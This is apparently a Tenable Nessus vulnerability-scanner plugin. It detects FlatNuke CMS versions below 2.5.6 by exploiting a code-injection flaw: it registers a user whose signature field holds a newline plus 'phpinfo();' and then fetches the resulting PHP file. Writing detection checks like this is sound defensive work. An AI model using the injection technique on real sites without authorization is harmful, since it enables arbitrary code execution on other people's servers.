#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running FlatNuke, a content management system
written in PHP and using flat files rather than a database for its
storage. 

The version of FlatNuke installed on the remote host suffers from
several flaws:

  - Arbitrary PHP Code Execution Vulnerability
    The application fails to remove newlines from a user's 
    registration information and stores it as a PHP file with 
    a known path. An attacker can leverage this flaw to 
    execute arbitrary PHP code on the remote host subject to
    the privileges of the web server userid.

  - Multiple Cross-Site Scripting Vulnerabilities
    Various scripts do not sanitize user-supplied input 
    through several parameters before using it in dynamically
    generated pages, which can be exploited by attackers to
    launch cross-site scripting attacks against the affected
    application.

See also : 

http://retrogod.altervista.org/flatnuke.html

Solution : 

Upgrade to FlatNuke 2.5.6 or later.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19396);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-2537", "CVE-2005-2538", "CVE-2005-2539", "CVE-2005-2540");
  script_bugtraq_id(14483, 14485);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"18549");
    script_xref(name:"OSVDB", value:"18550");
    script_xref(name:"OSVDB", value:"18551");
    script_xref(name:"OSVDB", value:"18552");
    script_xref(name:"OSVDB", value:"18553");
    script_xref(name:"OSVDB", value:"18554");
  }

  script_name(english:"FlatNuke < 2.5.6 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in FlatNuke < 2.5.6");
 
  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Initialize some variables.
user = rand_str();
pass = rand_str();


# Loop through directories.
if (thorough_tests) dirs = make_list("/flatnuke", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to call the forum registration script.
  req = http_get(item:string(dir, "/forum/index.php?op=vis_reg"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like FlatNuke's registration script.
  if (
    "<input type=hidden name=op value=reg>" >< res &&
    'Powered by <b><a href="http://flatnuke.sourceforge.net">FlatNuke' >< res
  ) {
    # Try to exploit the flaw to run phpinfo().
    postdata = raw_string(
      "op=reg&",
      "nome=", user, "&",
      "regpass=", pass, "&",
      "reregpass=", pass, "&",
      "firma=", 0x0d, "phpinfo();"
    );
    req = string(
      "POST ", dir, "/forum/index.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # Now try to retrieve the template.
    req = http_get(
      item:string(dir, "/forums/users/", user, ".php"), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like the output of phpinfo().
    if ("PHP Version" >< res) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus has successfully exploited this vulnerability in registering",
        "the user '", user, "' in FlatNuke on the remote host. You are\n",
        "strongly encouraged to delete this user as soon as possible as\n",
        "it can be used to reveal information about how PHP is configured\n",
        "on the remote host.\n"
      );

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
